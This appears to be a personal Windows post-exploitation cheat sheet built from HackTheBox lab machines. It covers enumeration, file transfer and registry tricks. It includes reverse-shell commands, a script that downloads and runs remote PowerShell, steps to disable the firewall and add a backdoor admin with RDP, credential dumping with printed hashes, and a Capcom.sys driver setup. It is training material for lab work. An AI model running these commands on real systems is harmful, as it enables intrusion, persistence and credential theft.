# Windows

Run PS script with a cmd.exe shell
```shell
type PowerUp.ps1 | powershell.exe -noprofile -
```

## File share

If you can't `net use` a shared folder, enable File and Printer via RDP, reboot if necessary. If you encounter error `A specified logon session does not exist.`, do [this](https://superuser.com/questions/968879/windows-10-map-network-drive-a-specified-logon-session-does-not-exist/1126123#1126123)

Use `rmdir` to delete recursively on Windows

```shell
C:\Tmp>rmdir SSFWin32\SSF-Win32 /s /q
rmdir SSFWin32\SSF-Win32 /s /q
```
List shares with PS: `Get-SmbShare`
List all visible properties of a local share: `Get-SmbShare -Name "print$" | Format-List -Property *`

## Powershell

Check for [PS history file ](https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html) at
`C:\Users\sansforensics408\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>`

Or print the path with `(Get-PSReadLineOption).HistorySavePath` but note this doesn't always print correct path.

`set` in PowerShell: `ls env:`

`systeminfo` = `Get-ComputerInfo`

`net user` = `Get-LocalUser | Select *`

`Get-PsDrive -PsProvider FileSystem` - List all drives and mapped shares

`icacls` = `Get-Acl C:\Users\svc_loanmgr | Select -Expand AccessToString`

#### 32 vs 64 bit PS

`[environment]::Is64BitProcess` Check if you're on a 32-bit or 64-bit PS shell

`[environment]::Is64BitOperatingSystem` Check if the Windows OS itself is 32 or 64-bit. Typically not necessary, since **Program Files (x86)** doesn't exist.

PS path for 32-bit: `C:\Windows\Syswow64\WindowsPowerShell\v1.0\powershell.exe`

PS path for 64-bit: `C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe`

Note the SysNative folder isn't visible when enumerating C:\Windows but you can still call the PS.exe

Hide/show PS errors. Useful if you just want to echo output. [Ref](https://stackoverflow.com/a/19274572/7908040)

```powershell
$ErrorActionPreference = "SilentlyContinue"; #This will hide errors
$someObject.SomeFunction();
$ErrorActionPreference = "Continue"; #Turning errors back on
```

### robocopy

```shell
C:\Temp\SSFWin32>robocopy \\172.16.10.5\lab9 C:\Temp\SSFWin32 /e
```
If need to pivot from Windows, and have problems with existing accounts, create account and net use with creds

```shell
net use \\10.100.11.101\pivot /user:admin Password1
```

# Files/folder enumeration

1. Check Recent, PS History folder of users. In particular, check where the *.lnk* files in **Recent** lead to ([ref](http://blog.unlockforus.org/2017/02/using-command-prompt-to-access-recent.html))

   ```text
   # Go to %userprofile%\AppData\Roaming\Microsoft\Windows\Recent\
   C:\Users\LawrenceAlbert\AppData\Roaming\Microsoft\Windows\Recent\
   # Note this works even if Recent folder in %userprofile% doesn't
   *Evil-WinRM* PS C:\Users\Hector\Recent> dir
   Access to the path 'C:\Users\Hector\Recent' is denied.
   At line:1 char:1
   + dir
   + ~~~
       + CategoryInfo          : PermissionDenied: (C:\Users\Hector\Recent:String) [Get-ChildItem], UnauthorizedAccessException
       + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
   
   # but
   *Evil-WinRM* PS C:\Users\Hector> cd AppData\Roaming\Microsoft\Windows\Recent\
   *Evil-WinRM* PS C:\Users\Hector\AppData\Roaming\Microsoft\Windows\Recent> dir -Force
   
   
       Directory: C:\Users\Hector\AppData\Roaming\Microsoft\Windows\Recent
   
   
   Mode                LastWriteTime         Length Name
   ----                -------------         ------ ----
   d-----       11/16/2019   3:12 PM                AutomaticDestinations
   d-----       11/25/2019  11:04 AM                CustomDestinations
   -a----       11/12/2019   6:08 PM           1397 ConsoleHost_history.lnk
   ---hs-        11/7/2019  12:17 PM            432 desktop.ini
   -a----        11/6/2019   6:47 PM            386 Local Disk (C).lnk
   -a----        11/6/2019   6:22 PM            761 MpCmdRun.lnk
   -a----       11/16/2019   3:12 PM            154 ms-settingsnetwork.lnk
   -a----        11/5/2019   2:31 PM            146 Programs and Features.lnk
   -a----       11/12/2019   6:08 PM           1057 PSReadLine.lnk
   -a----        11/6/2019   6:47 PM            527 Restore.lnk
   -a----        11/6/2019   6:22 PM            588 Temp.lnk
   -a----       11/16/2019   3:12 PM            104 The Internet.lnk
   -a----        11/1/2019  12:26 PM            530 user.lnk
   -a----        11/6/2019   6:24 PM            210 windowsdefender--history-threatId= 2147723573.lnk
   ```

2. Check Recycle Bin. Here's how to `cd` there:

   ```text
   PS C:\users> cd C:\"$"Recycle.Bin
   PS C:\$Recycle.Bin> dir -Force
   
   
       Directory: C:\$Recycle.Bin
   
   
   Mode                LastWriteTime         Length Name                                                                  
   ----                -------------         ------ ----                                                                  
   d--hs-        6/21/2018   3:24 PM                S-1-5-18                                                              
   d--hs-        6/22/2018   5:51 AM                S-1-5-21-1791094074-1363918840-4199337083-1001                        
   d--hs-        8/19/2018   9:31 AM                S-1-5-21-1791094074-1363918840-4199337083-1002                        
   d--hs-        8/19/2018  10:02 AM                S-1-5-21-1791094074-1363918840-4199337083-500              
   ```

3. `tree` in PS

   ```text
   PS C:\inetpub\wwwroot\internal-01\simple_chat> tree /A /F
   Folder PATH listing
   Volume serial number is 02000002 F84E:9CF7
   C:.
   |   .htaccess
   |   chat.php
   |   index.php
   |   init_chat.php
   |   login.php
   |   login_form.php
   |   logout.php
   |   register.php
   |   register_form.php.bak
   |
   +---css
   |       chat_emb.css
   |       chat_full.css
   |       chat_global.css
   |
   +---includes
   |       chat_func.php
   |       core_func.php
   |       dbconnect.php
   |       markup_func.php
   |       validation_func.php
   |
   +---js
   |       chat.js
   |       jquery-2.0.3.min.js
   |
   \---media
       \---smilies
               biggrin.gif
               cool.gif
               mellow.gif
               ohmy.gif
               sad.gif
               smile.gif
               tongue.gif
               wink.gif
   ```

4. List files in folders recursively

   ```powershell
   # List all files in subfolders recursively
   Get-ChildItem -Recurse
   # Pipe to Select to list files with full paths
   Get-ChildItem -Recurse | Select FullName
   ```


## Security mitigation

Disable FW if possible with `C:\Temp>netsh advfirewall set allprofiles state off`. Check status of FW with `C:\Temp>netsh advfirewall show allprofiles state`

## Enumeration

```shell
C:\Temp>Fping.exe -g 172.30.111.1/172.30.111.254
Fping.exe -g 172.30.111.1/172.30.111.254

Fast pinger version 3.00
(c) Wouter Dhondt (http://www.kwakkelflap.com)
```

## RunAs.ps1

Save this as **RunAs.ps1**, host with Python webserver

```powershell
# RunAs.ps1
$username = 'cascade.local\Administrator' # Keep the domain/hostname in if fails
$password = 'baCT3r1aN00dles' # Use single quotes where possible
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username,$secstr
Invoke-Command -ScriptBlock {IEX(New-Object Net.WebClient).downloadString('http://10.10.14.78/rshell.ps1')} -Credential $cred -Computer localhost
```

Then run this in the PS shell

```powershell
Start-Job -ScriptBlock { IEX(New-Object Net.WebClient).downloadString("http://10.10.14.78/RunAs.ps1") }
```

This will keep both the low priv and get the other shell if successful.

Alternatively if IEX can't work you must use nc.exe do `Invoke-Command`

```powershell
Invoke-Command -ScriptBlock {C:\Temp\nc.exe 10.10.14.78 443 -e powershell} -Credential $cred -Computer localhost
```

This makes the shell hang though. To keep it add the "AsJob" [parameter](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7.1)

```powershell
Invoke-Command -ScriptBlock {C:\Temp\nc.exe 10.10.14.78 443 -e powershell} -AsJob -Credential $cred -Computer localhost
```

## Start another shell

```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "C:\Temp\nc64.exe 10.10.14.78 443 -e powershell.exe"
# or
Start-Job -ScriptBlock {C:\Temp\nc64.exe 10.10.14.78 443 -e powershell.exe}
# or in cmd.exe only if you are admin
wmic /node:"localhost" process call create "C:\Temp\nc64.exe 10.10.14.78 443 -e powershell.exe"
```

## Update patches

Downloaded Windows update patches are stored in **C:\Windows\SoftwareDistribution\Download** but not necessarily installed; handy way of checking if a system is unpatched.

## Set up RDP for post-exploitation

```text
net user /add admin Password1
net localgroup administrators admin /add
net localgroup "Remote Desktop Users" admin  /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

Last step may not be needed if RDP not disabled. Then RDP in. `/cert-ignore` to automatically accept cert.

```bash
xfreerdp /v:10.10.10.95:3389 /u:admin /p:Password1 /size:90% /cert-ignore
```


## Pillaging

### Credentials dumping 

If you somehow have access to **SAM**, **SYSTEM** and **SECURITY** in `C:\Windows\System32\config`, use Impacket's **secretsdump.py**

```shell
root@Kali:~/HTB/Bastion# secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:e4487d0421e6611a364a5028467e053c:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword 
(Unknown User):bureaulampje
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x32764bdcb45f472159af59f1dc287fd1920016a6
dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd
[*] Cleaning up... 
```

## Kernel exploits 

### Compilation

If you need to compile a kernel exploit, note that some C code has Microsoft implementation that won't work with normal mingw cross-compilation ie. `root@Kali:~/HTB/Optimum# x86_64-w64-mingw32-gcc 41015.c -o 41015.exe`

Instead, compile it with **Developer Command Prompt for Visual Studio** (type into Start)
```shell
D:\HTB\Optimum>cl 41015.c /link /out:41015_new2.exe
Microsoft (R) C/C++ Optimizing Compiler Version 19.10.25027 for x86
Copyright (C) Microsoft Corporation.  All rights reserved.

41015.c
Microsoft (R) Incremental Linker Version 14.10.25027.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:41015.exe
/out:41015_new2.exe
41015.obj

D:\HTB\Optimum>dir 41015_new2.exe
 Volume in drive D is OS
 Volume Serial Number is 0EE7-D347

 Directory of D:\HTB\Optimum

19/04/2020  21:16           123,904 41015_new2.exe
               1 File(s)        123,904 bytes
               0 Dir(s)  589,864,071,168 bytes free
```
# Service enumeration

`Get-Service` - Needs permission to open Service Control Manager. Also see writeup [for Control](https://ivanitlearning.wordpress.com/2021/05/16/hackthebox-control/)

# Enumeration scripts

## Check .NET version

If it's below 4.0 we can check this.

```shell
PS C:\Users> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\CDF
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.0
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4.0
```

If above, check this

```powershell
PS C:\Users> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full
    CBS    REG_DWORD    0x1
    Install    REG_DWORD    0x1
    InstallPath    REG_SZ    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\
    Release    REG_DWORD    0x70bf6
    Servicing    REG_DWORD    0x0
    TargetVersion    REG_SZ    4.0.0
    Version    REG_SZ    4.7.03190

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full\1033
# Or
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" | Select-Object -Expand "Version"
```

## PS scripts

1. [PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck)
2. [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

First change Execution policy, then either run directly or Import Module with full path to .ps1 file. Also make it output as utf-8 rather than utf16-le by default. [Ref](https://stackoverflow.com/a/58920518/7908040).

```powershell
Set-ExecutionPolicy Bypass -Scope process -Force
$PSDefaultParameterValues = @{'Out-File:Encoding' = 'utf8'}
Import-Module C:\Users\FSmith\AppData\Local\Temp\PrivescCheck.ps1
.\PrivescCheck.ps1; Invoke-PrivescCheck -Extended | Tee-Object "privesccheck.txt"
```
For PowerUp.ps1

```text
Invoke-AllChecks | Tee-Object powerup.txt
```

# File transfer


## smbserver.py

For more recent Windows versions (from Server 2016 onwards?), need to specify username/password and smb2support:

On Kali:
```shell
root@Kali:~/HTB/SecNotes/SMB# smbserver.py -username kali -password kali -smb2support secnotes .
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

On target:
```shell
PS C:\inetpub\new-site> net use X: \\10.10.14.78\secnotes /user:kali kali
The command completed successfully.

PS C:\inetpub\new-site> dir X:\


    Directory: X:\


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----
-a----       10/19/2020   5:59 AM         280604 PrivescCheck.ps1

```

Alternatively with PS:

```shell
$pass = "jeeves" | ConvertTo-SecureString -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PsCredential("jeeves",$pass)
New-PSDrive -Name X -Root \\10.10.14.78\jeeves -Credential $Cred -PSProvider FileSystem
```

Now it is accessible as **X:**

## FTP file upload

[Reference](https://stackoverflow.com/a/46582183/7908040). Run this on Kali, install with `apt install python3-pyftpdlib`

```text
root@kali:~/CTF/HTB/Cascade/PE# python3 -m pyftpdlib -p 21 -w
/usr/lib/python3/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2020-12-08 01:17:40] >>> starting FTP server on 0.0.0.0:21, pid=10641 <<<
[I 2020-12-08 01:17:40] concurrency model: async
[I 2020-12-08 01:17:40] masquerade (NAT) address: None
[I 2020-12-08 01:17:40] passive ports: None
[I 2020-12-08 01:18:38] 10.10.10.182:49790-[] FTP session opened (connect)
[I 2020-12-08 01:18:38] 10.10.10.182:49790-[anonymous] USER 'anonymous' logged in.
[I 2020-12-08 01:18:38] 10.10.10.182:49790-[anonymous] STOR /root/CTF/HTB/Cascade/PE/winpeas.txt completed=1 bytes=92284 seconds=0.052
```

On Windows PS, do this to upload the file.

```powershell
$client = New-Object System.Net.WebClient
$client.Credentials = New-Object System.Net.NetworkCredential("anonymous", "password")
$client.UploadFile("ftp://10.10.14.78/winpeas.txt", "C:\Users\s.smith\Downloads\winpeas.txt")
```

Note: This won't work in PS ConstrainedLanguage

## IWR download

With Python Webserver running run this to download files to target

```powershell
Invoke-WebRequest -Uri "http://10.10.14.78/PowerUp.ps1" -OutFile PowerUp.ps1
# or more briefly
IWR http://10.10.14.78/PowerUp.ps1 -OutFile PowerUp.ps1
```

## File checksum

SHA256 file checksum after downloading/uploading

```text
*Evil-WinRM* PS C:\Users\svc-print\Downloads> Get-FileHash 20210119060559_BloodHound.zip

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          B0C329CA70EF5B71ABE4D1025E0E168E0C25A5778264007148338791C70A6BEB       C:\Users\svc-print\Downloads\20210119060559_BloodHound.zip
root@kali:~/CTF/HTB/Fuse/PE# sha256sum 20210119060559_BloodHound.zip
b0c329ca70ef5b71abe4d1025e0e168e0c25a5778264007148338791c70a6beb  20210119060559_BloodHound.zip
```

## Registry enumeration/editing

List all the drives, including registry

```text
*Evil-WinRM* PS C:\Users\svc-print> Get-PSDrive

Name           Used (GB)     Free (GB) Provider      Root                                                                                                                                                                                 CurrentLocation
----           ---------     --------- --------      ----                                                                                                                                                                                 ---------------
Alias                                  Alias
C                                      FileSystem    C:\                                                                                                                                                                                  Users\svc-print
Cert                                   Certificate   \
D                                      FileSystem    D:\
Env                                    Environment
Function                               Function
HKCU                                   Registry      HKEY_CURRENT_USER
HKLM                                   Registry      HKEY_LOCAL_MACHINE
Variable                               Variable
WSMan                                  WSMan
```

By default only HKCU, HKLM available. To load a hive do this

```text
*Evil-WinRM* PS HKLM:\> New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS

Name           Used (GB)     Free (GB) Provider      Root                                                                                                                                                                                 CurrentLocation
----           ---------     --------- --------      ----                                                                                                                                                                                 ---------------
HKU                                    Registry      HKEY_USERS

*Evil-WinRM* PS C:\Users\svc-print\Downloads> Get-PSDrive -PSProvider Registry

Name           Used (GB)     Free (GB) Provider      Root                                                                                                                                                                                 CurrentLocation
----           ---------     --------- --------      ----                                                                                                                                                                                 ---------------
HKCU                                   Registry      HKEY_CURRENT_USER
HKLM                                   Registry      HKEY_LOCAL_MACHINE
HKU                                    Registry      HKEY_USERS
*Evil-WinRM* PS C:\Users\svc-print\Downloads> cd HKU:\
*Evil-WinRM* PS HKU:\> cd S-1-5-21-2633719317-1471316042-3957863514-1104
*Evil-WinRM* PS HKU:\S-1-5-21-2633719317-1471316042-3957863514-1104>
```

Add keys to registry. With [this ref](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-itemproperty?view=powershell-7.1). Some eg.

```powershell
New-Item –Path "HKU:\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet" –Name FakeService
$registrypath = "HKU:\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\FakeService"

$name = "ImagePath"
$value = "\??\C:\Users\svc-print\Downloads\Capcom.sys"
$property_type = "ExpandString"
New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType $property_type

$name = "Type"
$value = "0x1"
$property_type = "DWord"
New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType $property_type
```

Verify with

```text
*Evil-WinRM* PS HKU:\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet> dir


    Hive: HKEY_USERS\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet


Name                           Property
----                           --------
FakeService                    ImagePath : \??\C:\Users\svc-print\Downloads\Capcom.sys
                               Type      : 1
Policies
*Evil-WinRM* PS HKU:\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet> reg query "HKU\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\FakeService"

HKEY_USERS\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\FakeService
    ImagePath    REG_EXPAND_SZ    \??\C:\Users\svc-print\Downloads\Capcom.sys
    Type    REG_DWORD    0x1
```

Some Registry folders have keys even though they might have subfolders. To list them

```text
PS HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon> Get-ItemProperty .
Get-ItemProperty .


AutoRestartShell             : 1
Background                   : 0 0 0
CachedLogonsCount            : 10
DebugServerCommand           : no
DefaultDomainName            : DESKTOP-7I3S68E
DefaultUserName              : Administrator
DisableBackButton            : 1
EnableSIHostIntegration      : 1
ForceUnlockLogon             : 0
LegalNoticeCaption           :
LegalNoticeText              :
PasswordExpiryWarning        : 5
PowerdownAfterShutdown       : 0
PreCreateKnownFolders        : {A520A1A4-1780-4FF6-BD18-167343C5AF16}
ReportBootOk                 : 1
Shell                        : explorer.exe
ShellCritical                : 0
ShellInfrastructure          : sihost.exe
SiHostCritical               : 0
SiHostReadyTimeOut           : 0
SiHostRestartCountLimit      : 0
SiHostRestartTimeGap         : 0
Userinit                     : C:\Windows\system32\userinit.exe,
VMApplet                     : SystemPropertiesPerformance.exe /pagefile
WinStationsDisabled          : 0
scremoveoption               : 0
DisableCAD                   : 1
LastLogOffEndTimePerfCounter : 215729203
ShutdownFlags                : 2147484203
AutoAdminLogon               : 1
DisableLockWorkstation       : 0
EnableFirstLogonAnimation    : 1
AutoLogonSID                 : S-1-5-21-988671444-1802818203-1364644418-500
LastUsedUsername             : Administrator
DefaultPassword              : 3130438f31186fbaf962f407711faddb
PSPath                       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_M
                               ACHINE\SOFTWARE\Microsoft\Windows
                               NT\CurrentVersion\Winlogon
PSParentPath                 : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_M
                               ACHINE\SOFTWARE\Microsoft\Windows
                               NT\CurrentVersion
PSChildName                  : Winlogon
PSDrive                      : HKLM
PSProvider                   : Microsoft.PowerShell.Core\Registry
```

This tells you the subfolders but not the keys of the current folder

```text
PS HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon> Get-ChildItem .
Get-ChildItem .


    Hive: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
    NT\CurrentVersion\Winlogon


Name                           Property
----                           --------
AlternateShells
GPExtensions
AutoLogonChecked
VolatileUserMgrKey
```

